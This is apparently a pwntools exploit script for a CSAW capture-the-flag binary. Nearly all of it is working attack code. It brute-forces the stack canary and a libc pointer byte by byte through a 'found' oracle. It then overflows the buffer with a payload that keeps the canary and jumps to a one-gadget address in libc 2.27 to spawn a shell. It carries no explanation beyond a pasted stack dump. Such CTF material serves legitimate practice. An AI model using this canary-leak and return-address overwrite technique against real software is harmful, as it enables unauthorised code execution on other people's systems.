# -*- coding: UTF-8 -*-
from pwn import *
context.arch = "amd64"
# context.binary = "/tmp/csaw/a.out"
# context.log_level = "debug"
p = process(
    "/tmp/host/csaw/a.out",
    env={
        "LD_PRELOAD": "/tmp/host/csaw/libc-2.27.so"})
raw_input()
# p = remote("pwn.chal.csaw.io", 1003)
# g = gdb.attach(p, "canary\n context\n vmmap\n continue")


def copy(s):
    p.sendline(str(2))
    p.sendline(str(len(s)))
    p.sendline(s)


def check(s):
    p.sendline(str(1))
    p.sendline(str(len(s)))
    p.sendline(s)
    return "found" in p.recvline()


bf = "A" * 9
copy(bf)
"""
00:0000│ rsp  0x7fffffffde90 ◂— 0x2
01:0008│      0x7fffffffde98 ◂— 0x55555bcd
02:0010│      0x7fffffffdea0 ◂— 0xbebafecaefbeadde
03:0018│      0x7fffffffdea8 ◂— 0xbd6d636b76b2a700
04:0020│ rbp  0x7fffffffdeb0 —▸ 0x7fffffffded0 —▸ 0x555555555b80 (__libc_csu_init) ◂— endbr64
05:0028│      0x7fffffffdeb8 —▸ 0x555555555053 (main+60) ◂— mov    eax, 0
06:0030│      0x7fffffffdec0 ◂— '\n\n\n\n\n\n\n\n'
07:0038│      0x7fffffffdec8 ◂— 0xbd6d636b76b2a700
"""

# leak canary
sp = set(['\t', ' ', '\n', '\x0b', '\x0c', '\r'])
for j in xrange(7):
    for i in xrange(1, 256):
        if chr(i) not in sp:
            if(check(bf + chr(i))):
                bf += chr(i)
                break

canary = unpack("\x00" + bf[9:])
success(hex(canary))

bf = "A" * 56
copy(bf)
for j in xrange(6):
    for i in xrange(256):
        if chr(i) not in sp:
            if(check(bf + chr(i))):
                bf += chr(i)
                break


libc = unpack(bf[56:] + "\x00\x00")
success(hex(libc))

pay = flat(0xdeadbeefdeadbeef,
           canary,
           0xdeadbeefdeadbeef,
           0x10a38c + (libc - 0x21b97),
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0,
           0)
context.log_level = "debug"
copy(pay)

p.interactive()
